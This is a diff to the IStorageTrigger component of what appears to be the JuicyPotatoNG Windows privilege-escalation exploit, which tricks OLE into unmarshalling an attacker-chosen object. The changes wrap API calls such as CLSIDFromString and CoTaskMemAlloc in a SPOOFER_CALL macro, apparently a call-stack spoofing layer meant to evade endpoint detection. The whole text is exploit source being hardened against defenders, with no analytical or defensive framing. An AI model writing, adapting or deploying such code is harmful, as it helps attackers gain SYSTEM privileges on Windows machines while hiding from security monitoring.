@@ -1,3 +1,5 @@
+﻿#include "Header.h"
+
 #include "IStorageTrigger.h"
 #include <stdio.h>
 
@@ -24,7 +26,7 @@ HRESULT IStorageTrigger::GetMarshalSizeMax(const IID& riid, void* pv, DWORD dwDe
 }
 
 HRESULT IStorageTrigger::GetUnmarshalClass(const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags, CLSID* pCid) {
-	CLSIDFromString(OLESTR("{00000306-0000-0000-c000-000000000046}"), pCid);
+	SPOOFER_CALL(CLSIDFromString)(OLESTR("{00000306-0000-0000-c000-000000000046}"), pCid);
 	//printf("IStorageTrigger GetUnmarshalClass\n");
 	return 0;
 }
@@ -157,7 +159,7 @@ HRESULT IStorageTrigger::Stat(STATSTG* pstatstg, DWORD grfStatFlag) {
 	_stg->Stat(pstatstg, grfStatFlag);
 	//Allocate from heap because apparently this will get freed in OLE32
 	const wchar_t c_s[] = L"JuicyPotatoNG.stg";
-	wchar_t* s = (wchar_t*)CoTaskMemAlloc(sizeof(c_s));
+	wchar_t* s = (wchar_t*)SPOOFER_CALL(CoTaskMemAlloc)(sizeof(c_s));
 	wcscpy_s(s, sizeof(c_s), c_s);
 	pstatstg[0].pwcsName = s;
 	return 0;
